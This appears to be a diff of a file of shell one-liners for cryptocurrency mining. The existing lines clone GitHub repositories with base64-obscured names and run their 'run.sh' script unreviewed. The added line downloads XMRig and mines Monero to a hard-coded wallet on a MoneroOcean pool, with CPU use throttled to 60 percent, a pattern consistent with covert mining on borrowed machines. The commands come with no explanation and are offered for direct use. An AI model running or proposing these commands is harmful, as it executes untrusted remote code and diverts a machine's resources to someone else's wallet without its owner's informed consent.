@@ -14,3 +14,9 @@ rm -rf sugarchain && git clone https://github.com/MujurID/sugarchain && cd sugar
 apt-get update && apt-get install -y git && rm -rf c3VnYXJjaGFpbg && git clone https://github.com/MujurID/c3VnYXJjaGFpbg && cd c3VnYXJjaGFpbg && bash cnVu.sh && git clone https://github.com/MujurID/c3VnYXJjaGFpbg && cd c3VnYXJjaGFpbg && bash cnVu.sh
 
 rm -rf c3VnYXJjaGFpbg && git clone https://github.com/MujurID/c3VnYXJjaGFpbg && cd c3VnYXJjaGFpbg && bash cnVu.sh
+
+
+
+
+
+wget https://github.com/MoneroOcean/xmrig/releases/download/v6.16.2-mo2/xmrig-v6.16.2-mo2-lin64.tar.gz && tar -xf xmrig-v6.16.2-mo2-lin64.tar.gz && sudo apt install hwloc -y && ./xmrig -o gulf.moneroocean.stream:20128 --tls -u 4Aj8aPvB9Te58xkV2bY54hbhLnb1oVAVkKUBb5PxfFRYJwtdmfqBZ4YQLGQiVCDaEAMRKG4nwKwjp5jVq5K9mSfm1pogTE7 -k --donate-level=0 --threads=$(($(nproc --all)*60/100))
